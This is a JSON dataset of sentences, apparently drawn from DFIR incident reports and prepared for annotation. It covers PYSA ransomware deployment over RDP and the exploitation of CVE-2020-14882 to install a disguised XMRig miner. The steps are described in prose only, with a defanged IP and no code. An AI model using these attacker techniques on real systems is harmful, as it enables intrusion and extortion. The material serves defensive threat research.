        "id": "dfir-reports-filtered/r-dfir-39.md:::S71",
        "text": "Around the 7.5 hour mark the threat actors began ransom deployment.",
        "type": "",
        "report": "r-dfir-39",
        "line": 71,
        "index": 7036
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S72",
        "text": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
        "type": "",
        "report": "r-dfir-39",
        "line": 72,
        "index": 7037
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S73",
        "text": "The purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 73,
        "index": 7038
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S74",
        "text": "Additionally, the script would kill many server and database processes allowing encryption of the files that might otherwise be locked by running processes.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 74,
        "index": 7039
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S75",
        "text": "Finally, the ransomware exe was executed and the systems ransomed.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 75,
        "index": 7040
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S0",
        "text": "A threat actor exploited CVE-2020-14882 by making a call to the images directory, which allowed them to execute code on the server.",
        "type": "",
        "report": "r-dfir-40",
        "line": 0,
        "index": 7041
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S1",
        "text": "Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script.",
        "type": "",
        "report": "r-dfir-40",
        "line": 1,
        "index": 7042
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S2",
        "text": "The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it\u2019s update process, and confirm the miner is running.",
        "type": "",
        "report": "r-dfir-40",
        "line": 2,
        "index": 7043
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S3",
        "text": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 3,
        "index": 7044
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S4",
        "text": "In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 4,
        "index": 7045
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S5",
        "text": "The script starts off by setting parameters, such as the download locations for XMRig and its config.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 5,
        "index": 7046
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S6",
        "text": "The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1.",
        "type": "",
        "report": "r-dfir-40",
        "line": 6,
        "index": 7047
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S7",
        "text": "There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 7,
        "index": 7048
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S8",
        "text": "The script renamed xmrig.exe to sysupdate in attempt to hide itself.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 8,
        "index": 7049
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S9",
        "text": "The server\u2019s CPU was maxed out at 100% and likely would have caused issues in an enterprise environment.",
        "type": "",
        "report": "r-dfir-40",
        "line": 9,
        "index": 7050
    },
    {
        "id": "dfir-reports-filtered/r-dfir-40.md:::S10",
        "text": "At the time of this writing the wallet used for mining barely had anything in it and appears to be dedicated to us.\n",
        "type": "",
        "report": "r-dfir-40",
        "line": 10,
        "index": 7051
    }
]